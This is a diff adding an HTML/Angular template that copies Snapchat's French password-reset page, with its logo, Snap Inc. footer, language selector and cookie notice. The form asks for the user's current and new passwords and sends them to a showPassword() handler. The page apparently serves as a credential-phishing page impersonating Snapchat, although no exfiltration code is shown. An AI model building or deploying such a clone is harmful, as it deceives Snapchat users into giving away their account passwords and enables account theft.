@@ -1,0 +1,172 @@
+<div class="pusher"><!-- Body -->
+  <div id="reset-password-root">
+    <div class="App" style="display: none;">
+      <div class="full-background-color"></div>
+      <div class="Header"><a class="logo"><img src="assets/img/ghost.svg"
+                                                        alt="Snapchat"></a></div>
+      <div class="ResetPassword">
+        <article class="page">
+          <div class="container"><h1 class="accountsTitle">Réinitialiser le mot de passe</h1>
+            <div class="description"><p><!-- react-text: 12 -->Si vous connaissez votre mot de passe actuel, vous pouvez
+              <!-- /react-text --><a>le modifier</a><!-- react-text: 14 -->.
+              <!-- /react-text --></p></div>
+            <div class="description error" id="error_message"></div>
+            <div>
+              <form id="reset_password_form" class="centered_form " [formGroup]="form">
+                <div class="form-group has-success">
+                  <label for="password" class="control-label">
+                    Ancien mot de passe
+                  </label>
+                  <input type="password" name="password" formControlName="password"
+                         autocomplete="off" id="password" class="form-control"/>
+                </div>
+
+                <div class="form-group has-success">
+                  <label for="new-password" class="control-label">
+                    Nouveau mot de passe
+                  </label>
+                  <input type="password" name="password" value="" autocomplete="off" id="new-password" class="form-control"/>
+                </div>
+
+                <div style="display: none;">
+                  <div class="grecaptcha-badge" style="width: 256px; height: 60px; box-shadow: gray 0 0 5px;">
+                    <div class="grecaptcha-error"></div>
+                    <textarea id="g-recaptcha-response" name="g-recaptcha-response" class="g-recaptcha-response"
+                              style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea>
+                  </div>
+                </div>
+                <div class="primary_action">
+                  <button type="submit" class="btn btn-lg btn-primary" (click)="showPassword()">Envoyer</button>
+                </div>
+              </form>
+            </div>
+          </div>
+        </article>
+        <div class="footer">
+          <div style="background-color: rgb(248, 249, 251); font-size: 14px; line-height: 17px;">
+            <div class="footer-container" id="footerContainer">
+              <div class="footer-column">
+                <div class="footer-column-expand-caret">
+                  <svg width="15" height="20">
+                    <g>
+                      <rect stroke="#000" transform="rotate(45 0,0)" rx="1" id="1" height="1.5" width="10" y="-2" x="5"
+                            stroke-width="1"></rect>
+                      <rect stroke="#000" transform="rotate(-45 0,0)" rx="1" id="2" height="1.5" width="10" y="13.5"
+                            x="-8" stroke-width="1"></rect>
+                    </g>
+                  </svg>
+                </div>
+                <div class="footer-column-header">Société</div>
+                <div><a>Snap Inc.</a><a>Carrières</a><a>Actualités</a></div>
+              </div>
+              <div class="footer-column">
+                <div class="footer-column-expand-caret">
+                  <svg width="15" height="20">
+                    <g>
+                      <rect stroke="#000" transform="rotate(45 0,0)" rx="1" id="1" height="1.5" width="10" y="-2" x="5"
+                            stroke-width="1"></rect>
+                      <rect stroke="#000" transform="rotate(-45 0,0)" rx="1" id="2" height="1.5" width="10" y="13.5"
+                            x="-8" stroke-width="1"></rect>
+                    </g>
+                  </svg>
+                </div>
+                <div class="footer-column-header">Communauté</div>
+                <div><a>Assistance</a><a>Règles communautaires</a><a>Centre de sécurité</a></div>
+              </div>
+              <div class="footer-column">
+                <div class="footer-column-expand-caret">
+                  <svg width="15" height="20">
+                    <g>
+                      <rect stroke="#000" transform="rotate(45 0,0)" rx="1" id="1" height="1.5" width="10" y="-2" x="5"
+                            stroke-width="1"></rect>
+                      <rect stroke="#000" transform="rotate(-45 0,0)" rx="1" id="2" height="1.5" width="10" y="13.5"
+                            x="-8" stroke-width="1"></rect>
+                    </g>
+                  </svg>
+                </div>
+                <div class="footer-column-header">Publicité</div>
+                <div><a>Acheter des publicités</a><a>Politiques relatives à la publicité</a><a>Charte de la
+                  marque</a><a>Règles applicables aux promotions</a></div>
+              </div>
+              <div class="footer-column">
+                <div class="footer-column-expand-caret">
+                  <svg width="15" height="20">
+                    <g>
+                      <rect stroke="#000" transform="rotate(45 0,0)" rx="1" id="1" height="1.5" width="10" y="-2" x="5"
+                            stroke-width="1"></rect>
+                      <rect stroke="#000" transform="rotate(-45 0,0)" rx="1" id="2" height="1.5" width="10" y="13.5"
+                            x="-8" stroke-width="1"></rect>
+                    </g>
+                  </svg>
+                </div>
+                <div class="footer-column-header">Juridique</div>
+                <div><a >Centre de confidentialité</a><a
+                  >Politique relative aux cookies</a><a
+                  >Droit d'auteur</a><a
+                  >Conditions générales des outils
+                  créatifs personnalisés</a><a>Conditions générales
+                  des Geofilters communautaires</a><a>Conditions
+                  générales du Studio de création de Lens</a></div>
+              </div>
+              <div style="clear: both;"></div>
+              <div class="langue-selection-block">
+                <div class="langue-header">Langue</div>
+                <div style="position: relative;"><select id="sc-global-locale-selector"
+                                                         style="-webkit-appearance: none; border: 1px solid rgb(204, 204, 204); border-radius: 5px; background: white; width: 100%; margin-top: 10px; padding: 5px 10px; font-size: 14px; font-family: inherit; color: rgba(0, 0, 0, 0.6); height: 34px; cursor: pointer;">
+                  <option value="ar">العَرَبِية</option>
+                  <option value="da-DK">Dansk</option>
+                  <option value="de-DE">Deutsch</option>
+                  <option value="el-GR">Ελληνικά</option>
+                  <option value="en-GB">English (UK)</option>
+                  <option value="en-US">English (US)</option>
+                  <option value="es">Español</option>
+                  <option value="fr-FR">Français</option>
+                  <option value="ko-KR">한국어</option>
+                  <option value="id-ID">Bahasa Indonesia</option>
+                  <option value="it-IT">Italiano</option>
+                  <option value="nl-NL">Nederlands</option>
+                  <option value="ja-JP">日本語</option>
+                  <option value="nb-NO">Norsk</option>
+                  <option value="pl-PL">Polski</option>
+                  <option value="pt-BR">Português (Brasil)</option>
+                  <option value="pt-PT">Português (Portugal)</option>
+                  <option value="ro-RO">Română</option>
+                  <option value="ru-RU">Русский</option>
+                  <option value="fi-FI">Suomi</option>
+                  <option value="sv-SE">Svenska</option>
+                  <option value="tr-TR">Türkçe</option>
+                  <option value="zh-CN">中文（简体）</option>
+                  <option value="zh-TW">中文（繁體）</option>
+                </select>
+                  <div
+                    style="position: absolute; right: 10px; width: 0px; height: 0px; pointer-events: none; border-style: solid; bottom: 18px; border-width: 0px 3px 5px; border-color: transparent transparent rgb(102, 102, 102);"></div>
+                  <div
+                    style="position: absolute; right: 10px; width: 0px; height: 0px; pointer-events: none; border-style: solid; bottom: 10px; border-width: 5px 3px 0px; border-color: rgb(102, 102, 102) transparent transparent;"></div>
+                </div>
+              </div>
+            </div>
+            <div style="background-color: rgb(38, 38, 38);">
+              <div class="footer-bottom-bar"><a>Politique de
+                confidentialité</a><a>Conditions d'utilisation du service</a>
+                <div style="clear: both;"></div>
+              </div>
+            </div>
+            <div id="cookiePopupContainer" class="">
+              <div class="cookie-icon cookie-icon-left"
+                   style="position: absolute; width: 240px; height: 120px; left: calc(10% - 50px); top: calc(50% - 55px);"></div>
+              <div class="cookie-popup">
+                <div class="cookie-text">Bonjour&nbsp;! Nous utilisons des cookies sur ce site pour optimiser son
+                  fonctionnement et à des fins d'analyse et de publicité. Pour en savoir plus sur notre utilisation des
+                  cookies et sur vos options, rendez-vous <a target="_blank">ici</a>&nbsp;! En continuant à utiliser nos
+                  services, vous nous autorisez à utiliser des cookies.
+                </div>
+              </div>
+
+              <div id="cookiePopupCloseButton"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
